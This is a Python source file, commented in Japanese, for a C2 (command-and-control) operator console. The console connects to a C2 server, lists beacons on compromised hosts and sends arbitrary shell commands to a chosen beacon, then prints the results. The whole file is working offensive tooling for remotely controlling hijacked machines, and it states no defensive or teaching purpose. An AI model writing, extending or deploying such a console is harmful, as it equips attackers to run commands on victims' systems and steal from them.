# -*- coding: utf-8 -*-
"""
攻撃者専用C2クライアント
C2サーバに接続してBeaconを制御する専用インターフェース
"""

import socket
import json
import threading
import time
import sys
import argparse
from datetime import datetime

class AttackerClient:
    def __init__(self, c2_host='127.0.0.1', c2_port=4444):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.socket = None
        self.connected = False
        self.beacons = {}
        self.command_history = []
        
    def log(self, message, level="INFO"):
        """ログ出力"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        color_codes = {
            "INFO": "\033[36m",    # シアン
            "SUCCESS": "\033[92m", # 緑
            "WARNING": "\033[93m", # 黄
            "ERROR": "\033[91m",   # 赤
            "RESULT": "\033[95m"   # マゼンタ
        }
        reset_code = "\033[0m"
        color = color_codes.get(level, "")
        print(f"{color}[{timestamp}][{level}]{reset_code} {message}")
    
    def connect_to_c2(self):
        """C2サーバに接続"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.c2_host, self.c2_port))
            self.connected = True
            self.log(f"C2サーバに接続: {self.c2_host}:{self.c2_port}", "SUCCESS")
            
            # 攻撃者クライアントとして登録
            auth_data = {
                'type': 'operator_auth',
                'client_type': 'attacker_console',
                'operator_id': f"operator_{int(time.time())}"
            }
            self.send_to_c2(auth_data)
            
            # 応答受信スレッド開始
            response_thread = threading.Thread(target=self.receive_responses)
            response_thread.daemon = True
            response_thread.start()
            
            return True
            
        except Exception as e:
            self.log(f"C2サーバ接続失敗: {e}", "ERROR")
            return False
    
    def send_to_c2(self, data):
        """C2サーバにデータ送信"""
        try:
            if self.socket and self.connected:
                message = json.dumps(data).encode('utf-8')
                self.socket.send(message)
                return True
        except Exception as e:
            self.log(f"送信エラー: {e}", "ERROR")
            self.connected = False
            return False
    
    def receive_responses(self):
        """C2サーバからの応答受信"""
        while self.connected:
            try:
                data = self.socket.recv(8192)
                if not data:
                    break
                    
                try:
                    response = json.loads(data.decode('utf-8'))
                    self.handle_response(response)
                except json.JSONDecodeError:
                    self.log(f"不正なJSON応答: {data}", "WARNING")
                    
            except Exception as e:
                if self.connected:
                    self.log(f"応答受信エラー: {e}", "ERROR")
                break
        
        self.connected = False
        self.log("C2サーバから切断されました", "WARNING")
    
    def handle_response(self, response):
        """C2サーバからの応答処理"""
        response_type = response.get('type')
        
        if response_type == 'beacon_list':
            self.beacons = response.get('beacons', {})
            self.display_beacons()
            
        elif response_type == 'command_result':
            beacon_id = response.get('beacon_id')
            command = response.get('command')
            result = response.get('result')
            timestamp = response.get('timestamp')
            
            self.log(f"[{beacon_id}] コマンド結果:", "RESULT")
            self.log(f"コマンド: {command}")
            print(f"\033[94m{result}\033[0m")  # 青色で結果表示
            
        elif response_type == 'beacon_status':
            beacon_id = response.get('beacon_id')
            status = response.get('status')
            self.log(f"[{beacon_id}] ステータス: {status}")
            
        elif response_type == 'error':
            error_msg = response.get('message', 'Unknown error')
            self.log(f"エラー: {error_msg}", "ERROR")
    
    def display_beacons(self):
        """アクティブBeacon一覧表示"""
        if not self.beacons:
            self.log("アクティブなBeaconはありません", "WARNING")
            return
            
        self.log("=== アクティブBeacon一覧 ===", "INFO")
        print(f"{'ID':<20} {'ホスト名':<15} {'IP':<15} {'最終確認':<12} {'OS':<10}")
        print("-" * 80)
        
        for beacon_id, info in self.beacons.items():
            hostname = info.get('info', {}).get('hostname', 'Unknown')
            ip = info.get('addr', ['Unknown', 0])[0]
            last_seen = datetime.fromtimestamp(info.get('last_seen', 0)).strftime("%H:%M:%S")
            platform = info.get('info', {}).get('platform', 'Unknown')
            
            print(f"{beacon_id:<20} {hostname:<15} {ip:<15} {last_seen:<12} {platform:<10}")
    
    def send_command(self, beacon_id, command):
        """指定Beaconにコマンド送信"""
        if beacon_id not in self.beacons:
            self.log(f"Beacon [{beacon_id}] が見つかりません", "ERROR")
            return False
            
        cmd_data = {
            'type': 'send_command',
            'beacon_id': beacon_id,
            'command': command
        }
        
        if self.send_to_c2(cmd_data):
            self.log(f"[{beacon_id}] コマンド送信: {command}", "SUCCESS")
            self.command_history.append((beacon_id, command, time.time()))
            return True
        return False
    
    def refresh_beacons(self):
        """Beacon一覧を更新"""
        refresh_data = {'type': 'get_beacons'}
        self.send_to_c2(refresh_data)
    
    def get_beacon_info(self, beacon_id):
        """特定Beaconの詳細情報取得"""
        if beacon_id not in self.beacons:
            self.log(f"Beacon [{beacon_id}] が見つかりません", "ERROR")
            return
            
        info_data = {
            'type': 'get_beacon_info',
            'beacon_id': beacon_id
        }
        self.send_to_c2(info_data)
    
    def command_interface(self):
        """コマンドラインインターフェース"""
        self.log("=== C2攻撃者コンソール ===", "SUCCESS")
        self.log("利用可能コマンド: help, beacons, use <beacon_id>, cmd <command>, info <beacon_id>, history, quit")
        
        selected_beacon = None
        
        while self.connected:
            try:
                if selected_beacon:
                    prompt = f"C2[{selected_beacon}]> "
                else:
                    prompt = "C2> "
                    
                user_input = input(prompt).strip()
                
                if not user_input:
                    continue
                    
                parts = user_input.split(' ', 1)
                command = parts[0].lower()
                
                if command == "quit" or command == "exit":
                    break
                    
                elif command == "help":
                    self.show_help()
                    
                elif command == "beacons":
                    self.refresh_beacons()
                    
                elif command == "use":
                    if len(parts) > 1:
                        beacon_id = parts[1]
                        if beacon_id in self.beacons:
                            selected_beacon = beacon_id
                            self.log(f"Beacon [{beacon_id}] を選択", "SUCCESS")
                        else:
                            self.log(f"Beacon [{beacon_id}] が見つかりません", "ERROR")
                    else:
                        self.log("使用法: use <beacon_id>", "WARNING")
                        
                elif command == "cmd":
                    if len(parts) > 1 and selected_beacon:
                        cmd_to_send = parts[1]
                        self.send_command(selected_beacon, cmd_to_send)
                    elif not selected_beacon:
                        self.log("まずBeaconを選択してください (use <beacon_id>)", "WARNING")
                    else:
                        self.log("使用法: cmd <command>", "WARNING")
                        
                elif command == "info":
                    if len(parts) > 1:
                        beacon_id = parts[1]
                        self.get_beacon_info(beacon_id)
                    elif selected_beacon:
                        self.get_beacon_info(selected_beacon)
                    else:
                        self.log("使用法: info <beacon_id>", "WARNING")
                        
                elif command == "history":
                    self.show_command_history()
                    
                elif command == "clear":
                    selected_beacon = None
                    self.log("Beacon選択を解除", "INFO")
                    
                # 直接コマンド送信（selected_beaconがある場合）
                elif selected_beacon:
                    self.send_command(selected_beacon, user_input)
                    
                else:
                    self.log(f"不明なコマンド: {command}. 'help'でヘルプ表示", "WARNING")
                    
            except EOFError:
                break
            except KeyboardInterrupt:
                print()
                break
            except Exception as e:
                self.log(f"コマンド処理エラー: {e}", "ERROR")
    
    def show_help(self):
        """ヘルプ表示"""
        help_text = """
=== C2攻撃者コンソール コマンド一覧 ===

基本コマンド:
  help                    - このヘルプを表示
  beacons                 - アクティブBeacon一覧を表示
  use <beacon_id>         - 操作対象Beaconを選択
  clear                   - Beacon選択を解除
  quit/exit               - コンソール終了

Beacon操作:
  cmd <command>           - 選択中BeaconにコマンドX送信
  info [beacon_id]        - Beacon詳細情報表示
  history                 - コマンド履歴表示

直接入力:
  Beacon選択後は直接コマンドを入力可能
  例: whoami, ls, pwd, ps

使用例:
  C2> beacons
  C2> use target_001
  C2[target_001]> whoami
  C2[target_001]> cmd ls -la /tmp
  C2[target_001]> info
        """
        print(help_text)
    
    def show_command_history(self):
        """コマンド履歴表示"""
        if not self.command_history:
            self.log("コマンド履歴はありません", "INFO")
            return
            
        self.log("=== コマンド履歴 ===", "INFO")
        for i, (beacon_id, command, timestamp) in enumerate(self.command_history[-10:], 1):
            time_str = datetime.fromtimestamp(timestamp).strftime("%H:%M:%S")
            print(f"{i:2}. [{time_str}] {beacon_id}: {command}")
    
    def disconnect(self):
        """C2サーバから切断"""
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        self.connected = False
        self.log("C2サーバから切断", "INFO")

def parse_arguments():
    """コマンドライン引数解析"""
    parser = argparse.ArgumentParser(description="C2攻撃者クライアント")
    parser.add_argument('-s', '--server', default='127.0.0.1',
                       help='C2サーバのIPアドレス (デフォルト: 127.0.0.1)')
    parser.add_argument('-p', '--port', type=int, default=4444,
                       help='C2サーバのポート (デフォルト: 4444)')
    return parser.parse_args()

def main():
    """メイン関数"""
    args = parse_arguments()
    
    client = AttackerClient(args.server, args.port)
    
    try:
        if client.connect_to_c2():
            # 初回Beacon一覧取得
            time.sleep(1)
            client.refresh_beacons()
            time.sleep(1)
            
            # コマンドインターフェース開始
            client.command_interface()
        else:
            print("C2サーバへの接続に失敗しました")
            
    except KeyboardInterrupt:
        print("\n攻撃者クライアント終了")
    except Exception as e:
        print(f"エラー: {e}")
    finally:
        client.disconnect()

if __name__ == "__main__":
    main()
